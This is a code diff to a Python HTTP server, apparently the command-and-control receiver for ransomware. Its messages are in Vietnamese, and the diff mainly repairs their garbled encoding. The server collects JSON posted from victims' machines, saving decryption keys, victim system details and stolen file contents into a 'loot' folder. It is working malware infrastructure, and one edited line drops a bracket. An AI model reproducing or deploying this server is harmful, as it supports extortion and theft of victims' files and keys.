@@ -15,7 +15,7 @@ class RansomHandler(BaseHTTPRequestHandler):
            
             data = json.loads(post_data)
         except Exception as e:
-            print(f" [!] Lá»—i giáº£i mĂ£ JSON: {e}")
+            print(f" !] Lỗi giải mã JSON: {e}")
             self.send_response(400)
             self.end_headers()
             return
@@ -24,18 +24,17 @@ class RansomHandler(BaseHTTPRequestHandler):
         loot_dir = os.path.join(os.getcwd(), "loot")
         if not os.path.exists(loot_dir):
             os.makedirs(loot_dir)
-
         
         if 'key' in data:
             with open(os.path.join(loot_dir, "decrypt.key"), "w") as f:
                 f.write(data['key'])
-            print(f" [+] ÄĂ£ lÆ°u Key giáº£i mĂ£: {data['key']}")
+            print(f" [+] Đã lưu Key giải mã: {data['key']}")
 
        
         if 'system' in data:
             with open(os.path.join(loot_dir, "victim_info.txt"), "w", encoding="utf-8") as f:
                 f.write(str(data['system']))
-            print(f" [+] ÄĂ£ lÆ°u thĂ´ng tin mĂ¡y náº¡n nhĂ¢n.")
+            print(f" [+] Đã lưu thông tin máy nạn nhân.")
 
         # Lấy nội dung file (EXE, PDF, TXT...)
         if 'content' in data:
@@ -48,9 +47,9 @@ class RansomHandler(BaseHTTPRequestHandler):
                     
                     with open(os.path.join(loot_dir, safe_name), "wb") as f:
                         f.write(file_bytes)
-                    print(f" [+] ÄĂ£ thu tháº­p vĂ  khĂ´i phá»¥c file: {safe_name}")
+                    print(f" [+] Đã thu thập và khôi phục file: {safe_name}")
                 except Exception as e:
-                    print(f" [!] Lá»—i khi xá»­ lĂ½ file {filename}: {e}")
+                    print(f" [!] Lỗi khi xử lý file {filename}: {e}")
 
         # Pháº£n há»“i cho victim
         self.send_response(200)
@@ -64,6 +63,6 @@ class RansomHandler(BaseHTTPRequestHandler):
 if __name__ == "__main__":
     server = HTTPServer(("0.0.0.0", 5000), RansomHandler)
     print("------------------------------------------")
-    print("C&C Server JSON Mode Ä‘ang cháº¡y táº¡i Port 5000...")
+    print("C&C Server JSON Mode đang chạy tại Port 5000...")
     print("------------------------------------------")
     server.serve_forever()
